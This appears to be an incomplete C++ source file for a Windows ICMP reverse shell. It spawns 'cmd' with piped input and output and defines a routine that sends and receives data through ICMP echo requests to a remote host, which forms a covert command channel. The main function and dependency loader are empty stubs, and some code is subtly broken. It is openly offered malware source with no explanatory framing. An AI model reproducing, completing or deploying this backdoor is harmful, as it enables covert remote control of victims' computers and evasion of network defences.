// ICMP.cpp : 定义控制台应用程序的入口点。
//

// Reference:   [inet_addr function](http://msdn.microsoft.com/en-us/library/windows/desktop/ms738563%28v=vs.85%29.aspx)
//              [IcmpSendEcho function](http://msdn.microsoft.com/en-us/library/windows/desktop/aa366050%28v=vs.85%29.aspx)
//              [IcmpCreateFile function](http://msdn.microsoft.com/en-us/library/windows/desktop/aa366045%28v=vs.85%29.aspx)

#include "stdafx.h"
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <WinSock2.h>
#include <IPHlpApi.h>

#define ICMP_HEADERS_SIZE    (sizeof(ICMP4_ECHO_REPLY) + 8)

#define STATUS_OK       0
#define STATUS_SINGLE   1
#define STATUS_PROCESS_NOT_CREATED  2

#define TRANSFER_SUCCESS    1
#define TRANSFER_FAILURE    0

#define DEFAULT_TIMEOUT         3000
#define DEFAULT_DELAY           200
#define DEFAULT_MAX_BLANKS      10
#define DEFALUT_MAX_DATA_SIZE   64

//FARPROC icmp_creat, icmp_send, to_ip;
HANDLE (WINAPI* icmp_creat)(void);
DWORD (WINAPI* icmp_send)(HANDLE IcmpHandle,
                          IPAddr DestinationAddress,
                          LPVOID RequestData,
                          WORD RequestSize,
                          PIP_OPTION_INFORMATION RequestOptions,
                          LPVOID ReplyBuffer,
                          DWORD ReplySize,
                          DWORD Timeout);
unsigned long (WINAPI* to_ip)(const char* cp);

int verbose = 0;

int spawn_shell(PROCESS_INFORMATION* pi, HANDLE* out_read, HANDLE* in_write)
{
    SECURITY_ATTRIBUTES sattr;
    STARTUPINFOA si;
    HANDLE in_read, out_write;

    //memset(pi, 0x00, sizeof(PROCESS_INFORMATION));
    //memset(&si, 0x00, sizeof(STARTUPINFOA));

    // creat communication pipes
    memset(&sattr, 0x00, sizeof(SECURITY_ATTRIBUTES));
    sattr.nLength = sizeof(SECURITY_ATTRIBUTES);
    sattr.bInheritHandle = TRUE;
    sattr.lpSecurityDescriptor = NULL;

    if(!CreatePipe(out_read, &out_write, &sattr, 0)){
        return STATUS_PROCESS_NOT_CREATED;
    }
    if(!SetHandleInformation(*out_read, HANDLE_FLAG_INHERIT, 0)) {
        return STATUS_PROCESS_NOT_CREATED;
    }

    if(!CreatePipe(&in_read, in_write, &sattr, 0)){
        return STATUS_PROCESS_NOT_CREATED;
    }
    if(!SetHandleInformation(*in_write, HANDLE_FLAG_INHERIT, 0)){
        return STATUS_PROCESS_NOT_CREATED;
    }

    //spawn process
    memset(&si, 0x00, sizeof(STARTUPINFOA));
    si.cb = sizeof(STARTUPINFOA);
    si.hStdError = out_write;
    si.hStdOutput = out_write;
    si.hStdInput = in_read;
    si.dwFlags |= STARTF_USESTDHANDLES;

    if(!CreateProcessA(NULL,
        "cmd",
        NULL,
        NULL,
        TRUE,
        0,
        NULL,
        NULL,
        (LPSTARTUPINFOA)&si,
        pi)){
            return STATUS_PROCESS_NOT_CREATED;
    }

    CloseHandle(out_write);
    CloseHandle(in_read);
    return STATUS_OK;
}

void create_icmp_channel(HANDLE* icmp_chan)
{
    // create icmp file
    * icmp_chan = (HANDLE) icmp_creat();
}

int transfer_icmp(HANDLE icmp_chan, 
                  unsigned int target, 
                  char* out_buf, 
                  unsigned int out_buf_size, 
                  char* in_buf, 
                  unsigned int in_buf_size, 
                  unsigned int max_in_data_size, 
                  unsigned int time_out){
    int rs;
    char* temp_in_buf;
    int nbytes;

    PICMP_ECHO_REPLY echo_reply;

    temp_in_buf = (char *)malloc(max_in_data_size + ICMP_HEADERS_SIZE);
    if(!temp_in_buf){
        return TRANSFER_FAILURE;
    }

    // send data to remote host
    rs = icmp_send(icmp_chan,
            target,
            out_buf,
            out_buf_size,
            NULL,
            temp_in_buf,
            max_in_data_size + ICMP_HEADERS_SIZE,
            time_out);

    // check received data
    if(rs > 0){
        echo_reply = (PICMP_ECHO_REPLY)temp_in_buf;
        if(echo_reply->DataSize > max_in_data_size){
            nbytes = max_in_data_size;
        } else {
            nbytes = echo_reply->DataSize;
        }
        memcpy(in_buf, echo_reply->Data, nbytes);
        in_buf_size = nbytes;

        free(temp_in_buf);
        return TRANSFER_SUCCESS;
    }
    free(temp_in_buf);
    return TRANSFER_FAILURE;
}

int load_deps(void)
{
    HMODULE lib;

}

int _tmain(int argc, _TCHAR* argv[])
{
    return 0;
}

